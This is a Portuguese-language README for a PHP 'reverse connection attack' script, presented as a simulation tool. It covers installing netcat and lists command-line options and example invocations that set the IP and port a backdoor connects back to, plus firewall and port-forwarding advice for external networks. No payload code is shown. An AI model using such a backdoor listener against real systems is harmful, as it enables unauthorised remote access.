# Reverse Connection Attack
__Script criado para simular ataques de conexão reversa mundialmente conhecido, de uma forma simples e utilizando a linguagem PHP__

<br>

__Importante*: Você precisa ter o NetCat em seu pc.__

<br>

**Caso já tenha, então pule os passos a seguir. Caso não tenha, baixe: https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip. Após baixado, coloque-o nas variáveis de ambiente para poder ser acessada de qualquer lugar do sistema, caso não, diga para o script o caminho até o Netcat.**
<table>
<tr>
  <th>Comando</th>
  <th>Opções</th>
  <th>Definição</th>
</tr>
<tr>
  <td rowspan="4">php client.php</td>
</tr>
<tr>
  <td>-h ou --host</td>
  <td>Define o seu IP para a backdoor</td>
</tr>
<tr>
  <td>-p ou --port</td>
  <td>Define a porta de escuta. Se utiliza para redes externas, libere a porta no firewall e permita o Port Fowarding no seu roteador principal.</td>
</tr>
<tr>
  <td>-dir ou --directory (opcional)</td>
  <td>Define o caminho (completo) do sistema até o arquivo .exe do Netcat</td>
</tr>
</table>

<br>

**Exemplos de uso:**

<li>php client.php --host 127.0.0.1 -p 7500</li>

<li>php client.php -h 127.0.0.1 -p 8080 --directory C:\Users\(seu usuário)\Documents\netcat-win32-1.12\nc.exe</li>

<li>php client.php --host 192.168.1.40 --port 6405 -d C:/netcat/nc.exe</li>
